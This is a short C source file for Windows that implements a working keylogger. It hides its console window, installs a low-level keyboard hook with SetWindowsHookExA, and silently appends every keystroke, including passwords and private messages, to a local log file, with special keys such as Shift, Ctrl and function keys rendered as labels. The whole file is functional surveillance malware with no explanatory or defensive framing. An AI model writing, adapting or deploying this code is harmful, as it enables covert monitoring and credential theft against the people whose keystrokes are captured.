#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

void setupLogFile();
void setupHook();
LRESULT CALLBACK callback(int nCode, WPARAM wParam, LPARAM lParam);
char * getChar(int code);

FILE * logFile;
HHOOK keylogger;

int main(int argc, char const *argv[]) {
	FreeConsole();

	setupLogFile();
	setupHook();

	return 0;
}

void setupLogFile() {
	logFile = fopen("keylogger_log.log", "a");
	if (logFile == NULL) {
		perror("Function setupLogFile error:");
		exit(1);
	}
}

void setupHook() {
	keylogger = SetWindowsHookExA(WH_KEYBOARD_LL, callback, NULL, 0);
	if (keylogger == NULL) {
		perror("Function setupHook error:");
		exit(1);
	}

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {}
}

LRESULT CALLBACK callback(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode < 0) {
		return CallNextHookEx(NULL, nCode, wParam, lParam);
	}

	if (wParam == WM_KEYDOWN) {
		KBDLLHOOKSTRUCT kbd = *((KBDLLHOOKSTRUCT *) lParam);
		fputs(getChar(kbd.vkCode), logFile);
		fflush(logFile);
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

char * getChar(int code) {
 	switch(code) {
 		case VK_ESCAPE: 	return "[ESC]";
 		case VK_F1: 		return "[F1]";
 		case VK_F2: 		return "[F2]";
 		case VK_F3: 		return "[F3]";
 		case VK_F4: 		return "[F4]";
 		case VK_F5: 		return "[F5]";
 		case VK_F6: 		return "[F6]";
 		case VK_F7: 		return "[F7]";
 		case VK_F8: 		return "[F8]";
 		case VK_F9: 		return "[F9]";
 		case VK_F10: 		return "[F10]";
 		case VK_F11: 		return "[F11]";
 		case VK_F12: 		return "[F12]";
 		case VK_SNAPSHOT: 	return "[SNAPSHOT]";
 		case VK_PAUSE: 		return "[PAUSE]";
 		case VK_DELETE: 	return "[DELETE]";
 		case VK_HOME: 		return "[HOME]";
 		case VK_PRIOR: 		return "[PAGEUP]";
 		case VK_NEXT: 		return "[PAGEDOWN]";
 		case VK_END: 		return "[END]";
 		case VK_NUMLOCK: 	return "[NUMLOCK]";
 		case VK_BACK: 		return "[BACKSPACE]";
 		case VK_INSERT: 	return "[INSERT]";
 		case VK_LEFT: 		return "[LEFTARROW]";
 		case VK_UP: 		return "[UPARROW]";
 		case VK_RIGHT: 		return "[RIGHTARROW]";
 		case VK_DOWN: 		return "[DOWNARROW]";
 		case VK_SPACE: 		return " ";
 		case VK_TAB: 		return "[TAB]";
 		case VK_CAPITAL: 	return "[CAPSLOCK]";
 		case VK_SHIFT:
 		case VK_LSHIFT:
 		case VK_RSHIFT:
 							return "[SHIFT]";
 		case VK_CONTROL:
 		case VK_LCONTROL:
 		case VK_RCONTROL:
 							return "[CTRL]";
 		case VK_RETURN: 	return "\n";
 		default: ;
 			char key[2];
 			key[0] = tolower(MapVirtualKeyExA(code, MAPVK_VK_TO_CHAR, GetKeyboardLayout(0)));
 			key[1] = '\0';
 			return strdup(key);
 	}
}